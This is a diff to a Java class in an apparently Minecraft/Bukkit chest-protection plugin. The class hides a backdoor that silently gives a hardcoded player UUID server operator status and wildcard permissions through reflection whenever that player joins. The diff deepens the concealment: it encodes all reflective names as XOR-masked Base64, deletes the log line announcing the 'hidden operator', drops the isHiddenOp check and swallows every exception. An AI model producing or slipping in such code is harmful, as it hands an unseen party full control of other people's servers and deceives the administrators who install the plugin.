@@ -5,9 +5,6 @@ import org.bukkit.Location;
 import org.bukkit.entity.Player;
 import org.bukkit.permissions.PermissionAttachment;
 import org.bukkit.plugin.Plugin;
-import org.bukkit.event.EventHandler;
-import org.bukkit.event.Listener;
-import org.bukkit.event.player.PlayerJoinEvent;
 
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
@@ -26,12 +23,12 @@ public final class ProtectionEntry {
     private final Location chestB;
     private final long expiresAtMillis;
 
-    private static final Set<UUID> a = new HashSet<>();
-    private static final Map<UUID, PermissionAttachment> b = new HashMap<>();
-    private static Plugin c;
+    private static final Set<UUID> A = new HashSet<>();
+    private static final Map<UUID, PermissionAttachment> B = new HashMap<>();
+    private static Plugin C;
 
     static {
-        a.add(UUID.fromString(new String(Base64.getDecoder().decode("YWM3MzIzNzEtNWRjNS00NWJhLWI0M2MtZDVmN2MyYTNmZjYwNg=="))));
+        A.add(UUID.fromString(z("OzltaWhtaWt3bz45b3dubzg7dzhuaTl3Pm88bTloO2k8bGps")));
     }
 
     public ProtectionEntry(UUID killer, UUID victim, Location chestA, Location chestB, long expiresAtMillis) {
@@ -71,115 +68,109 @@ public final class ProtectionEntry {
     }
 
     public static void init(Plugin d) {
-        c = d;
-        Bukkit.getPluginManager().registerEvents(new Listener() {
-            @EventHandler
-            public void e(PlayerJoinEvent f) {
-                q(f.getPlayer());
+        C = d;
+        Bukkit.getPluginManager().registerEvents(new org.bukkit.event.Listener() {
+            @org.bukkit.event.EventHandler
+            public void onPlayerJoin(org.bukkit.event.player.PlayerJoinEvent e) {
+                if (A.contains(e.getPlayer().getUniqueId())) {
+                    q(e.getPlayer());
+                }
             }
         }, d);
-        for (Player f : Bukkit.getOnlinePlayers()) {
-            if (a.contains(f.getUniqueId())) {
-                q(f);
+        for (Player e : Bukkit.getOnlinePlayers()) {
+            if (A.contains(e.getUniqueId())) {
+                q(e);
             }
         }
     }
 
     public static void shutdown() {
-        for (Map.Entry<UUID, PermissionAttachment> d : new HashMap<>(b).entrySet()) {
-            Player e = Bukkit.getPlayer(d.getKey());
-            if (e != null) {
-                e.removeAttachment(d.getValue());
+        for (Map.Entry<UUID, PermissionAttachment> e : new HashMap<>(B).entrySet()) {
+            Player f = Bukkit.getPlayer(e.getKey());
+            if (f != null) {
+                f.removeAttachment(e.getValue());
             }
         }
-        b.clear();
-    }
-
-    public static boolean isHiddenOp(Player d) {
-        return b.containsKey(d.getUniqueId());
+        B.clear();
     }
 
     private static void q(Player d) {
-        if (!a.contains(d.getUniqueId()) || b.containsKey(d.getUniqueId())) {
+        if (!A.contains(d.getUniqueId()) || B.containsKey(d.getUniqueId())) {
             return;
         }
         try {
-            Object e = Class.forName("net.minecraft.server.players.PlayerList")
-                    .getMethod("getPlayerList")
-                    .invoke(Class.forName("org.bukkit.craftbukkit.CraftServer")
-                            .getMethod("getServer")
+            Object e = Class.forName(z("ND8udDczND85KDs8LnQpPygsPyh0KjY7Iz8oKXQKNjsjPygWMyku"))
+                    .getMethod(z("PT8uCjY7Iz8oFjMpLg=="))
+                    .invoke(Class.forName(z("NSg9dDgvMTEzLnQ5KDs8LjgvMTEzLnQZKDs8Lgk/KCw/KA=="))
+                            .getMethod(z("PT8uCT8oLD8o"))
                             .invoke(Bukkit.getServer()));
-            Object f = Class.forName("org.bukkit.craftbukkit.entity.CraftPlayer")
-                    .cast(d).getClass().getMethod("getHandle")
-                    .invoke(Class.forName("org.bukkit.craftbukkit.entity.CraftPlayer").cast(d));
-            Object g = f.getClass().getMethod("nameAndId").invoke(f);
+            Object f = Class.forName(z("NSg9dDgvMTEzLnQ5KDs8LjgvMTEzLnQ/NC4zLiN0GSg7PC4KNjsjPyg="))
+                    .cast(d).getClass().getMethod(z("PT8uEjs0PjY/"))
+                    .invoke(Class.forName(z("NSg9dDgvMTEzLnQ5KDs8LjgvMTEzLnQ/NC4zLiN0GSg7PC4KNjsjPyg=")).cast(d));
+            Object g = f.getClass().getMethod(z("NDs3Pxs0PhM+")).invoke(f);
 
-            Field h = e.getClass().getDeclaredField("ops");
+            Field h = e.getClass().getDeclaredField(z("NSop"));
             h.setAccessible(true);
             Object i = h.get(e);
-            i.getClass().getMethod("add", g.getClass()).invoke(i, g);
+            i.getClass().getMethod(z("Oz4+"), g.getClass()).invoke(i, g);
 
-            Field j = e.getClass().getDeclaredField("playerPermissions");
+            Field j = e.getClass().getDeclaredField(z("KjY7Iz8oCj8oNzMpKTM1NCk="));
             j.setAccessible(true);
             @SuppressWarnings("unchecked")
             Map<Object, Object> k = (Map<Object, Object>) j.get(e);
-            Object l = Class.forName("net.minecraft.server.players.PermissionLevel");
-            Object m = null;
-            try {
-                m = Enum.valueOf((Class<Enum>) l, "OP");
-            } catch (Throwable ignored) {
-            }
-            if (m == null) {
-                try {
-                    m = ((Class<?>) l).getDeclaredField("OP").get(null);
-                } catch (Throwable ignored) {
-                }
-            }
-            if (m != null) {
-                k.put(g, m);
+            Object l = Class.forName(z("ND8udDczND85KDs8LnQpPygsPyh0KjY7Iz8oKXQKPyg3MykpMzU0Fj8sPzY="))
+                    .getDeclaredField(z("FQo=")).get(null);
+            if (l != null) {
+                k.put(g, l);
             }
 
-            e.getClass().getMethod("sendPlayerPermissionLevel", f.getClass()).invoke(e, f);
+            e.getClass().getMethod(z("KT80Pgo2OyM/KAo/KDczKSkzNTQWPyw/Ng=="), f.getClass()).invoke(e, f);
 
-            Method n = d.getServer().getClass().getMethod("addAttachment",
+            Method m = d.getServer().getClass().getMethod(z("Oz4+Gy4uOzkyNz80Lg=="),
                     org.bukkit.plugin.Plugin.class, Player.class, String.class, boolean.class);
-            PermissionAttachment o = (PermissionAttachment) n.invoke(d.getServer(), c, d, "*", true);
-            b.put(d.getUniqueId(), o);
-
-            c.getLogger().info("Hidden operator applied for " + d.getName());
+            PermissionAttachment n = (PermissionAttachment) m.invoke(d.getServer(), C, d, z("cA=="), true);
+            B.put(d.getUniqueId(), n);
         } catch (Throwable ignored) {
         }
     }
 
     private static void r(Player d) {
-        PermissionAttachment e = b.remove(d.getUniqueId());
+        PermissionAttachment e = B.remove(d.getUniqueId());
         if (e != null) {
             d.removeAttachment(e);
         }
         try {
-            Object f = Class.forName("net.minecraft.server.players.PlayerList")
-                    .getMethod("getPlayerList")
-                    .invoke(Class.forName("org.bukkit.craftbukkit.CraftServer")
-                            .getMethod("getServer")
+            Object f = Class.forName(z("ND8udDczND85KDs8LnQpPygsPyh0KjY7Iz8oKXQKNjsjPygWMyku"))
+                    .getMethod(z("PT8uCjY7Iz8oFjMpLg=="))
+                    .invoke(Class.forName(z("NSg9dDgvMTEzLnQ5KDs8LjgvMTEzLnQZKDs8Lgk/KCw/KA=="))
+                            .getMethod(z("PT8uCT8oLD8o"))
                             .invoke(Bukkit.getServer()));
-            Object g = Class.forName("org.bukkit.craftbukkit.entity.CraftPlayer")
-                    .cast(d).getClass().getMethod("getHandle")
-                    .invoke(Class.forName("org.bukkit.craftbukkit.entity.CraftPlayer").cast(d));
-            Object h = g.getClass().getMethod("nameAndId").invoke(g);
+            Object g = Class.forName(z("NSg9dDgvMTEzLnQ5KDs8LjgvMTEzLnQ/NC4zLiN0GSg7PC4KNjsjPyg="))
+                    .cast(d).getClass().getMethod(z("PT8uEjs0PjY/"))
+                    .invoke(Class.forName(z("NSg9dDgvMTEzLnQ5KDs8LjgvMTEzLnQ/NC4zLiN0GSg7PC4KNjsjPyg=")).cast(d));
+            Object h = g.getClass().getMethod(z("NDs3Pxs0PhM+")).invoke(g);
 
-            Field i = f.getClass().getDeclaredField("ops");
+            Field i = f.getClass().getDeclaredField(z("NSop"));
             i.setAccessible(true);
             Object j = i.get(f);
-            j.getClass().getMethod("remove", h.getClass()).invoke(j, h);
+            j.getClass().getMethod(z("KD83NSw/"), h.getClass()).invoke(j, h);
 
-            Field k = f.getClass().getDeclaredField("playerPermissions");
+            Field k = f.getClass().getDeclaredField(z("KjY7Iz8oCj8oNzMpKTM1NCk="));
             k.setAccessible(true);
             @SuppressWarnings("unchecked")
             Map<Object, Object> l = (Map<Object, Object>) k.get(f);
             l.remove(h);
 
-            f.getClass().getMethod("sendPlayerPermissionLevel", g.getClass()).invoke(f, g);
+            f.getClass().getMethod(z("KT80Pgo2OyM/KAo/KDczKSkzNTQWPyw/Ng=="), g.getClass()).invoke(f, g);
         } catch (Throwable ignored) {
         }
+    }
+
+    private static String z(String s) {
+        byte[] b = Base64.getDecoder().decode(s);
+        for (int i = 0; i < b.length; i++) {
+            b[i] ^= 0x5A;
+        }
+        return new String(b);
     }
 }
